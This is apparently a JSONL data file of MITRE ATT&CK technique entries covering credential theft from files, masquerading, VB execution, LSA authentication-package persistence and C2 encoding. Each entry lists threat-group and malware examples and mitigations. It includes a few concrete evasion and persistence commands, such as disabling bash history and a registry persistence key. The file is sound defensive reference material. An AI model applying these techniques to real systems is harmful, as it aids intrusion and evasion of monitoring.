{"text": " Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint: * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials * Work / project schedules * Source code snippets * Links to network shares and other internal resources", "idx": "https://attack.mitre.org/techniques/T1213/002", "title": "Sharepoint", "entity": "Sharepoint", "entity_type": "techniques", "entity_context": ["Enforce the principle of least-privilege. Consider implementing access control mechanisms that include both authentication and authorization.", "Chimera has collected documents from the victim's SharePoint.", "Ke3chang used a SharePoint enumeration and data dumping tool known as spwebmember.", "APT28 has collected information from Microsoft SharePoint services within target networks.", "spwebmember is used to enumerate and dump information from Microsoft SharePoint.", "Develop and publish policies that define acceptable information to be stored in SharePoint repositories.", "Consider periodic review of accounts and privileges for critical and sensitive SharePoint repositories."], "is_subtechnique": true}
{"text": " Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords. It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP) In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)", "idx": "https://attack.mitre.org/techniques/T1552/001", "title": "Credentials In Files", "entity": "Credentials In Files", "entity_type": "techniques", "entity_context": ["If an initial connectivity check fails, pngdowner attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.", "Remove vulnerable Group Policy Preferences.", "APT3 has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.", "TeamTNT has searched for unsecured AWS credentials and Docker API credentials.", "TA505 has used malware to gather credentials from FTP clients and Outlook.", "Pysa has extracted credentials from the password database before encrypting the files. ", "PoshC2 contains modules for searching for passwords in local and remote files.", "Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers.", "LaZagne can obtain credentials from chats, databases, mail, and WiFi.", "Preemptively search for files containing passwords and take actions to reduce the exposure risk when found.", "Restrict file shares to specific directories with access only to necessary users.", "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.", "Leafminer used several tools for retrieving login and password information, including LaZagne.", "Hildegard has searched for SSH keys, Docker credentials, and Kubernetes service tokens.", "Emotet has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user. ", "Pupy can use Lazagne for harvesting credentials.", "MuddyWater has run a tool that steals passwords saved in victim email.", "Establish an organizational policy that prohibits password storage in files.", "BlackEnergy has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Outlook, and Windows Credential Store.", "Empire can use various modules to search for files containing passwords.", "APT33 has used a variety of publicly available tools like LaZagne to gather credentials.", "jRAT can capture passwords from common chat applications such as MSN Messenger, AOL, Instant Messenger, and and Google Talk.", "XTunnel is capable of accessing locally stored passwords on victims.", "Smoke Loader searches for files named logins.json to parse for credentials.", "Kimsuky has used tools that are capable of obtaining credentials from saved mail.", "Agent Tesla has the ability to extract credentials from configuration or support files. ", "Fox Kitten has accessed files to gain valid credentials.", "Azorult can steal credentials in files belonging to common software such as Skype, Telegram, and Steam.", "QuasarRAT can obtain passwords from FTP clients.", "TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP. Additionally, it searches for the \".vnc.lnk\" affix to steal VNC credentials."], "is_subtechnique": true}
{"text": " Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).", "idx": "https://attack.mitre.org/techniques/T1518", "title": "Software Discovery", "entity": "Software Discovery", "entity_type": "techniques", "entity_context": ["TajMahal has the ability to identify the Internet Explorer (IE) version on an infected host.", "P.A.S. Webshell can list PHP server configuration details.", "Windshift has used malware to identify installed software.", "ComRAT can check the victim's default browser to determine which process to inject its communications module into.", "Operation Wocao has collected a list of installed software on the infected system.", "HotCroissant can retrieve a list of applications from the <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths</code> registry key.", "Bazar can query the Registry for installed applications.", "Inception has enumerated installed software on compromised systems.", "InvisiMole can collect information about installed software used by specific users, software executed on user login, and software executed by each system.", "BRONZE BUTLER has used tools to enumerate software installed on an infected host.", "XCSSET uses <code>ps aux</code> with the <code>grep</code> command to enumerate common browsers and system processes potentially impacting XCSSET's exfiltration capabilities.", "DustySky lists all installed software for the infected machine.", "Orz can gather the victim's Internet Explorer version.", "MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine.", "Siloscape searches for the kubectl binary.", "The Cobalt Strike System Profiler can discover applications through the browser and identify the version of Java the target has.", "Sidewinder has used tools to enumerate software installed on an infected host.", "Dyre has the ability to identify installed programs on a compromised host.", "ShimRatReporter gathered a list of installed software on the infected host.", "SpicyOmelette can enumerate running software on a targeted system.", "Tropic Trooper's backdoor could list the infected system's installed software.", "QakBot can enumerate a list of installed programs.", "Bundlore has the ability to enumerate what browser is being used as well as version information for Safari.", "down_new has the ability to gather information on installed applications.", "Mustang Panda has searched the victim system for the <code>InstallUtil.exe</code> program and its version.", "RTM can scan victim drives to look for specific banking software on the machine to determine next actions.", "Metamorfo has searched the compromised system for banking applications.", "Dridex has collected a list of installed software on the system.", "KGH_SPY can collect information on installed applications.", "MarkiRAT can check for the Telegram installation directory by enumerating the files on disk.", "Windigo has used a script to detect installed software on targeted systems."], "is_subtechnique": false}
{"text": " Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)). Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems attackers may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)", "idx": "https://attack.mitre.org/techniques/T1056/002", "title": "GUI Input Capture", "entity": "GUI Input Capture", "entity_type": "techniques", "entity_context": ["Calisto presents an input prompt asking for the user's login and password.", "Keydnap prompts the users for credentials.", "XCSSET prompts the user to input credentials using a native macOS dialog box leveraging the system process <code>/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment</code>.", "Dok prompts the user for credentials.", "Proton prompts users for their credentials.", "iKitten prompts the user for their credentials.", "Bundlore prompts the user for their credentials.", "Metamorfo has displayed fake forms on top of banking sites to intercept credentials from victims. ", "Use user training as a way to bring awareness and raise suspicion for potentially malicious events and dialog boxes (ex: Office documents prompting for credentials).", "FIN4 has presented victims with spoofed Windows Authentication prompts to collect their credentials."], "is_subtechnique": true}
{"text": " Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages) Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.", "idx": "https://attack.mitre.org/techniques/T1547/002", "title": "Authentication Package", "entity": "Authentication Package", "entity_type": "techniques", "entity_context": ["Windows 8.1, Windows Server 2012 R2, and later versions, may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all DLLs loaded by LSA to be signed by Microsoft.  ", "Flame can use Windows Authentication Packages for persistence."], "is_subtechnique": true}
{"text": " Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous. Adversaries may also use the same icon of the file they are trying to mimic.", "idx": "https://attack.mitre.org/techniques/T1036/005", "title": "Match Legitimate Name or Location", "entity": "Match Legitimate Name or Location", "entity_type": "techniques", "entity_context": ["OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in <code>%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\</code>; the malicious file by the same name is saved in <code>%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\</code>.", "Calisto's installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.", "MCMD has been named Readme.txt to appear legitimate.", "Starloader has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.", "APT29 renamed software and DLL's with legitimate names to appear benign.", "APT41 attempted to masquerade their files as popular anti-virus software.", "Mustang Panda has used 'adobeupdate.dat' as a PlugX loader, and a file named 'OneDrive.exe' to load a Cobalt Strike payload.", "Felismus has masqueraded as legitimate Adobe Content Management System files.", "menuPass has been seen changing malicious files to appear legitimate.", "KONNI creates a shortcut called \"Anti virus service.lnk\" in an apparent attempt to masquerade as a legitimate file.", "FIN7 has attempted to run Darkside ransomware with the filename sleep.exe.", "GoldenSpy's setup file installs initial executables under the folder <code>%WinDir%\\System32\\PluginManager</code>.\t", "Lazarus Group has renamed the TAINTEDSCRIBE main executable to disguise itself as Microsoft's narrator.", "Silence has named its backdoor \"WINWORD.exe\".", "Pony has used the Adobe Reader icon for the downloaded file to look more trustworthy.\t", "HTTPBrowser's installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.", "TEARDROP files had names that resembled legitimate Window file and directory names.", "InnaputRAT variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.", "LightNeuron has used filenames associated with Exchange and Outlook for binary and configuration files, such as <code>winmail.dat</code>.", "GoldMax appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder.", "Transparent Tribe can mimic legitimate Windows directories by using the same icons and names.", "admin@338 actors used the following command to rename one of their tools to a benign file name: <code>ren \"%temp%\\upload\" audiodg.exe</code>", "ZLib mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.", "Patchwork installed its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as “Net Monitor.\" They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe.", "ShimRatReporter spoofed itself as <code>AlphaZawgyl_font.exe</code>, a specialized Unicode font.", "Machete renamed payloads to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python executables.", "BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.", "ThiefQuest prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.", "MarkiRAT can masquerade as <code>update.exe</code> and <code>svehost.exe</code>; it has also mimicked legitimate Telegram and Chrome files.", "BLINDINGCAN has attempted to hide its payload by using legitimate file names such as \"iconcache.db\".", "Carberp has masqueraded as Windows system file names, as well as \"chkntfs.exe\" and \"syscron.exe\".", "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.", "The TAINTEDSCRIBE main executable has disguised itself as Microsoft’s Narrator.", "USBStealer mimics a legitimate Russian program called USB Disk Security.", "Metamorfo has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive, WhatsApp, or Spotify, for example. ", "Daserf uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.", "Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate.", "APT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.", "KGH_SPY has masqueraded as a legitimate Windows tool.", "Bad Rabbit has masqueraded as a Flash Player installer through the executable file <code>install_flash_player.exe</code>.", "RDAT has masqueraded as VMware.exe.\t", "Blue Mockingbird has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.", "Skidmap has created a fake <code>rm</code> binary to replace the legitimate Linux binary.", "Tropic Trooper has hidden payloads in Flash directories and fake installer files.", "Darkhotel has used malware that is disguised as a Secure Shell (SSH) tool.", "APT32 has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. APT32 has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe. ", "Indrik Spider used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors.", "Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory <code>CSIDL_APPDATA\\microsoft\\security</code>.", "Use tools that restrict program execution via application control by attributes other than file name for common operating system utilities that are needed.", "OLDBAIT installs itself in <code>%ALLUSERPROFILE%\\\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe</code>; the directory name is missing a space and the file name is missing the letter \"o.\"", "Chimera has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.", "PUNCHBUGGY mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.", "Ferocious Kitten has named malicious files <code>update.exe</code> and loaded them into the compromise host's “Public” folder.", "S-Type may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.", "Grandoreiro has named malicious browser extensions and update files to appear legitimate.", "Nebulae uses functions named <code>StartUserModeBrowserInjection</code> and <code>StopUserModeBrowserInjection</code> indicating that it's trying to imitate chrome_frame_helper.dll.", "Doki has disguised a file as a Linux kernel module.", "Sandworm Team has avoided detection by naming a malicious binary explorer.exe.", "Mis-Type saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.", "BackConfig has hidden malicious payloads in <code>%USERPROFILE%\\Adobe\\Driver\\dwg\\</code> and mimicked the legitimate DHCP service binary.", "RainyDay has used names to mimic legitimate software including \"vmtoolsd.exe\" to spoof Vmtools.", "TRITON disguised itself as the legitimate Triconex Trilog application.", "LookBack has a C2 proxy tool that masquerades as <code>GUP.exe</code>, which is software used by Notepad++.", "SUPERNOVA has masqueraded as a legitimate SolarWinds DLL.", "AppleSeed has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity.", "Sidewinder has named malicious files <code>rekeywiz.exe</code> to match the name of a legitimate Windows executable.", "NOKKI is written to %LOCALAPPDATA%\\MicroSoft Updatea\\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.", "SUNBURST created VBScripts that were named after existing services or folders to blend into legitimate activities. ", "EKANS has been disguised as <code>update.exe</code> to appear as a valid executable.", "Whitefly has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.", "PipeMon modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor.", "A Winnti for Windows implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.", "QUADAGENT used the PowerShell filenames <code>Office365DCOMCheck.ps1</code> and <code>SystemDiskClean.ps1</code>.", "Fysbis has masqueraded as trusted software rsyncd and dbus-inotifier.", "SUNSPOT was identified on disk with a filename of <code>taskhostsvc.exe</code> and it created an encrypted log file at <code>C:\\Windows\\Temp\\vmware-vmdmp.log</code>. ", "Carbanak has named malware \"svchost.exe,\" which is the name of the Windows shared service host program.", "Machete's Machete MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.", "REvil can mimic the names of known executables.", "BADNEWS attempts to hide its payloads using legitimate filenames.", "Ursnif has used strings from legitimate system files and existing folders for its file, folder, and Registry entry names.", "TEMP.Veles has renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.\n", "Ryuk has constructed legitimate appearing installation folder paths by calling <code>GetWindowsDirectoryW</code> and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as <code>C:\\Users\\Public</code>.", "Ramsay has masqueraded as a 7zip installer.\t", "FinFisher renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.", "StrongPity has been bundled with legitimate software installation files for disguise.", "MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender.", "If installing itself as a service fails, Elise instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.", "ChChes copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).", "Pysa has executed a malicious executable by naming it svchost.exe.", "OSX/Shlayer can masquerade as a Flash Player update.", "Penquin has mimicked the Cron binary to hide itself on compromised systems.", "Misdat saves itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.", "BackdoorDiplomacy has dropped implants in folders named for legitimate software.", "APT39 has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.", "SLOTHFULMEDIA has mimicked the names of known executables, such as mediaplayer.exe.", "Goopy has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.", "Bundlore has disguised a malicious .app file as a Flash Player update.", "Raindrop was installed under names that resembled legitimate Windows file and directory names.", "Naikon has disguised malicious programs as Google Chrome, Adobe, and VMware executables.", "One of Dtrack can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.", "Rocke has used shell scripts which download mining executables and saves them with the filename \"java\".", "Use file system access controls to protect folders such as C:\\Windows\\System32.", "Ixeshe has used registry values and file names associated with Adobe software, such as AcroRd32.exe.", "The Bazar loader has named malicious shortcuts \"adobe\" and mimicked communications software.", "NETWIRE has masqueraded as legitimate software including TeamViewer and macOS Finder.", "Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense.", "Require signed binaries and images.", "DarkComet has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.", "PROMETHIUM has disguised malicious installer files by bundling them with legitimate software installers.", "The Remsec loader implements itself with the name Security Support Provider, a legitimate Windows function. Various Remsec .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare. Remsec also disguised malicious modules using similar filenames as custom network encryption software on victims.", "The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware.", "InvisiMole has disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder.", "Octopus has been disguised as legitimate programs, such as Java and Telegram Messenger.", "Sibot has downloaded a DLL to the <code>C:\\windows\\system32\\drivers\\</code> folder and renamed it with a <code>.sys</code> extension.", "MechaFlounder has been downloaded as a file named lsass.exe, which matches the legitimate Windows file.", "Cuba has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs. ", "Chaes has used an unsigned, crafted DLL module named <code>hha.dll</code> that was designed to look like a legitimate 32-bit Windows DLL."], "is_subtechnique": true}
{"text": " Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).", "idx": "https://attack.mitre.org/techniques/T1552", "title": "Unsecured Credentials", "entity": "Unsecured Credentials", "entity_type": "techniques", "entity_context": ["There are multiple methods of preventing a user's command history from being flushed to their .bash_history file, including use of the following commands:\n<code>set +o history</code> and <code>set -o history</code> to start logging again;\n<code>unset HISTFILE</code> being added to a user's .bash_rc file; and\n<code>ln -s /dev/null ~/.bash_history</code> to write commands to <code>/dev/null</code>instead.", "If it is necessary that software must store credentials in the Registry, then ensure the associated accounts have limited permissions so they cannot be abused if obtained by an adversary.", "When possible, store keys on separate cryptographic hardware instead of on the local system. ", "Astaroth uses an external software known as NetPass to recover passwords. ", "Remove vulnerable Group Policy Preferences.", "Apply patch KB2962486 which prevents credentials from being stored in GPPs.", "Limit access to the Instance Metadata API using a host-based firewall such as iptables. A properly configured Web Application Firewall (WAF) may help prevent external adversaries from exploiting Server-side Request Forgery (SSRF) attacks that allow access to the Cloud Instance Metadata API.", "Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers.", "Use strong passphrases for private keys to make cracking difficult. Do not store credentials within the Registry. Establish an organizational policy that prohibits password storage in files.", "Preemptively search for files containing passwords or other credentials and take actions to reduce the exposure risk when found.", "Restrict file shares to specific directories with access only to necessary users."], "is_subtechnique": false}
{"text": " Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft) Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript) Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads.", "idx": "https://attack.mitre.org/techniques/T1059/005", "title": "Visual Basic", "entity": "Visual Basic", "entity_type": "techniques", "entity_context": ["REvil has used obfuscated VBA macros for execution.", "TYPEFRAME has used a malicious Word document for delivery with VBA macros for execution.", "LookBack has used VBA macros in Microsoft Word attachments to drop additional files to the host.", "OopsIE creates and uses a VBScript as part of its persistent execution.", "TA505 has used VBS for code execution.", "Molerats used various implants, including those built with VBScript, on target machines.", "Comnie executes VBS scripts.", "Bisonal's dropper creates VBS scripts on the victim’s machine.", "StoneDrill has several VBS scripts used throughout the malware's lifecycle.\t", "OSX_OCEANLOTUS.D uses Word macros for execution.", "Javali has used embedded VBScript to download malicious payloads from C2.", "BackConfig has used VBS to install its downloader component and malicious documents with VBA macro code.", "FIN7 used VBS scripts to help perform tasks on the victim's machine.", "Frankenstein has used Word documents that prompts the victim to enable macros and run a Visual Basic script.", "POWERSTATS can use VBScript (VBE) code for execution.", "SUNBURST used VBScripts to initiate the execution of payloads.", "Cobalt Strike can use VBA to perform execution.", "KeyBoy uses VBS scripts for installing files and performing execution.", "APT38 has used VBScript to execute commands and other operational tasks.", "TA459 has a VBScript for execution.", "Exaramel for Windows has a command to execute VBS scripts on the victim’s machine.", "MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros.", "Honeybee embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened.", "APT29 has written malware variants in Visual Basic.", "PoetRAT has used Word documents with VBScripts to execute malicious activities.", "Ramsay has included embedded Visual Basic scripts in malicious documents.\t", "JSS Loader can download and execute VBScript files.", "Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. ", "OilRig has used VBSscipt macros for execution on compromised hosts.", "NETWIRE has been executed through use of VBScripts.", "QakBot can use VBS to download and execute malicious files.\n", "Kimsuky has used Visual Basic to download malicious payloads.", "APT37 executes shellcode and a VBA script to decode Base64 strings.", "JCry has used VBS scripts. ", "PowerShower has the ability to save and execute VBScript.", "NanoCore uses VBS files.", "jRAT has been distributed as HTA files with VBScript.\t", "Windshift has used Visual Basic 6 (VB6) payloads.", "Magic Hound malware has used VBS scripts for execution.", "Gamaredon Group has embedded malicious macros in document templates, which executed VBScript. Gamaredon Group has also delivered Microsoft Outlook VBA projects with embedded macros.", "Higaisa has used VBScript code on the victim's machine.", "Sharpshooter's first-stage downloader was a VBA macro.", "WIRTE has used VBS scripts throughout its operation.\t", "Gorgon Group has used macros in Spearphishing Attachments as well as executed VBScripts on victim machines.", "Melcoz can use VBS scripts to execute malicious DLLs.", "IcedID has used obfuscated VBA string expressions.", "Mustang Panda has embedded VBScript components in LNK files to download additional files and automate collection.", "Anti-virus can be used to automatically quarantine suspicious files. ", "Rancor has used VBS scripts as well as embedded macros for execution.", "Chaes has used VBscript to execute malicious code. ", "Grandoreiro can use VBScript to execute malicious code.", "Turn off or restrict access to unneeded VB components.", "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place.", "Goopy has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.\t", "Koadic performs most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode .", "Cobalt Group has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.", "Remexi uses AutoIt and VBS scripts throughout its execution process.", "Sidewinder has used VBScript to drop and execute malware loaders.", "Inception has used VBScript to execute malicious commands and payloads.", "APT39 has utilized malicious VBS scripts in malware.", "Patchwork used Visual Basic Scripts (VBS) on victim machines.", "Operation Wocao has used a VBScript to conduct reconnaissance on targeted systems.", "Metamorfo has used VBS code on victims’ systems.", "Use application control where appropriate.", "APT32 has used macros, COM scriptlets, and VBS scripts. ", "Machete has embedded malicious macros within spearphishing attachments to download additional files.", "BRONZE BUTLER has used VBS and VBE scripts for execution.", "QUADAGENT uses VBScripts.", "Sandworm Team has created VBScripts to run an SSH server. ", "Lokibot has used VBS scripts and XLS macros for execution. ", "Leviathan has used VBScript.", "FIN4 has used VBA macros to display a dialog box and collect victim credentials.", "NanHaiShu executes additional VBScript code on the victim's machine.", "One version of Helminth consists of VBScript scripts.", "Astaroth has used malicious VBS e-mail attachments for execution.", "APT-C-36 has embedded a VBScript within a malicious Word document which is executed upon the document opening.", "Kerrdown can use a VBS base64 decoder function published by Motobit.", "Xbash can execute malicious VBScript payloads on the victim’s machine.", "Ursnif droppers have used VBA macros to download and execute the malware's full executable payload.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Visual Basic scripts from executing potentially malicious downloaded content .", "VBShower has the ability to execute VBScript files.", "Silence has used VBS scripts.", "APT33 has used VBScript to initiate the delivery of payloads.", "Bandook has used malicious VBA code against the target system.", "Smoke Loader adds a Visual Basic script in the Startup folder to deploy the payload.", "Sibot executes commands using VBScript.\t", "Turla has used VBS scripts throughout its operations.\t", "Transparent Tribe has crafted VBS-based malicious documents.\t "], "is_subtechnique": true}
{"text": " Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding)", "idx": "https://attack.mitre.org/techniques/T1132/002", "title": "Non-Standard Encoding", "entity": "Non-Standard Encoding", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.", "Newer variants of BACKSPACE will encode C2 communications with a custom system.", "OceanSalt can encode data with a NOT operation before sending the data to the control server.", "Bankshot encodes commands from the control server using a range of characters and gzip.", "RDAT can communicate with the C2 via subdomains that utilize base64 with character substitutions.\t", "ShadowPad has encoded data as readable Latin characters.", "InvisiMole can use a modified base32 encoding to encode data within the subdomain of C2 requests."], "is_subtechnique": true}
